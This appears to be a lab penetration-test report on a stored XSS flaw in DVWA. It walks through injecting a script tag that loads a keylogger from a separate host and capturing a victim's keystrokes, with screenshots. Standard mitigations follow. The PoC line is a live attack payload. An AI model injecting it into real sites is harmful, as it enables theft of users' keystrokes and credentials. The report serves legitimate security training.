# 🛡️ Penetration Test Report --- Stored XSS Attack
name: yehuda cohen


## 📌 1. Executive Summary

A high-level overview of the test, the assessed system, scope, and the
overall security posture regarding the identified vulnerability.

## 🎯 2. Scope of Testing

-   IP: 10.0.2.15
-   URL: http://10.0.2.15/DVWA/vulnerabilities/xss_s


## 🧪 3. Methodology

Testing was conducted according to widely accepted penetration-testing
standards:\
- OWASP Web Security Testing Guide (WSTG)
- PTES (Penetration Testing Execution Standard)

Stages of the assessment:
1. Reconnaissance
2. Client-side and server-side testing
3. Input injection testing
4. Exploitation and validation
5. Risk analysis
6. Recommendations and mitigation planning

## ⚠️ 4. Vulnerability Details --- Stored XSS

### 4.4 Description

A description of the Stored Cross-Site Scripting vulnerability and its
implications.

### 4.2 Impact

-   Execution of arbitrary JavaScript in users' browsers
-   Theft of session tokens or sensitive data
-   Account takeover
-   Actions performed on behalf of unsuspecting users
-   Delivery of phishing payloads, redirects, keyloggers, etc.

### 4.3 Affected Component

-   Vulnerable module/page
-   Relevant URL
-   Parameters vulnerable to injection

### 4.4 Proof of Concept (PoC)

<script type="text/javascript" src="http://192.168.31.162/tal/test1.js"></script>

## 🔍 5. Steps to Reproduce

**1.  Navigate to the vulnerable input field**

   <img width="1089" height="645" alt="image" src="https://github.com/user-attachments/assets/5e6a056c-4f85-4d3c-b9ad-d8ed8831cc6d" />

   <img width="828" height="330" alt="image" src="https://github.com/user-attachments/assets/caffaa57-11a0-4015-873a-f0cd1e099a38" />

<img width="828" height="330" alt="image" src="https://github.com/user-attachments/assets/b3d53e11-2e3f-4b3e-80da-5b35c24dc620" />


**2.  Insert js code - for check if vulnerable**

<img width="700" height="180" alt="image" src="https://github.com/user-attachments/assets/b504e6db-9779-4768-be29-289dd9f1a816" />

<img width="832" height="371" alt="image" src="https://github.com/user-attachments/assets/2816039e-f68e-4121-9071-69cda871a1d7" />

3. Create js keylogger
   <img width="1006" height="566" alt="image" src="https://github.com/user-attachments/assets/564d613a-5333-418b-ac23-e7d63f064546" />

<img width="1153" height="62" alt="image" src="https://github.com/user-attachments/assets/d233c99b-3ce5-423d-bf45-fb1db14b9a98" />

   <img width="1174" height="65" alt="image" src="https://github.com/user-attachments/assets/51dbac0a-d1ad-4aa0-a56c-bac20db41178" />

<img width="892" height="478" alt="image" src="https://github.com/user-attachments/assets/9bd10927-2603-4a11-b75b-14118285eae7" />
<img width="980" height="128" alt="image" src="https://github.com/user-attachments/assets/fcb58c25-c61d-4906-a803-92178ed0a6f0" />

**test1.js:**
<img width="870" height="510" alt="image" src="https://github.com/user-attachments/assets/a5d2a640-f0b5-43c8-a4c3-e78dda65398c" />

**3. Exploitation of the vulnerability**
Injecting a link to the malicious keylogger script through the vulnerable input field
<img width="739" height="218" alt="image" src="https://github.com/user-attachments/assets/eac9e9cf-65aa-4189-b307-c8eeca783b1a" />

**4. Problem Identified — Input Length Restriction**
The input field is limited to 50 characters.
Using browser developer tools, we identify the client-side restriction and modify the maxlength attribute to 250 characters

<img width="1280" height="428" alt="image" src="https://github.com/user-attachments/assets/fb2e13bb-7a4b-4994-884d-84f4358e6577" />
<img width="961" height="84" alt="image" src="https://github.com/user-attachments/assets/f3ce999d-c8be-4987-a053-b132fae29e9b" />

**5. Payload Injection**
With the extended limit, we exploit the XSS vulnerability and inject the malicious keylogger link.

<img width="819" height="233" alt="image" src="https://github.com/user-attachments/assets/99d1ae6a-4a37-478c-bac8-e057f5623d53" />

**6. Keylogger Evidence**
The attacker can now view logged keystrokes captured from the victim’s browser.
<img width="1183" height="461" alt="image" src="https://github.com/user-attachments/assets/eea39330-7771-4bef-96a8-18b5b5dab3a9" />

<img width="809" height="232" alt="image" src="https://github.com/user-attachments/assets/717588bc-4940-4685-bdf8-6453d7a8256f" />



## 📉 6. Risk Rating

  Category       Level
  -------------- --------------
  Impact         High
  Likelihood     High
  Overall Risk   **Critical**

## 🛠️ 8. Recommendations

### 8.1 Immediate Fixes

-   Implement HTML encoding
-   Sanitize user input
-   Block dangerous characters

### 8.2 Long-Term Security Improvements

-   Enforce CSP
-   Use HTTPOnly cookies
-   Apply WAF rules
-   Improve secure coding practices


## 📚 9. References

-   OWASP XSS Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
-   OWASP WSTG - https://owasp.org/www-project-web-security-testing-guide/
-   CWE-79 - https://cwe.mitre.org/data/definitions/79.html
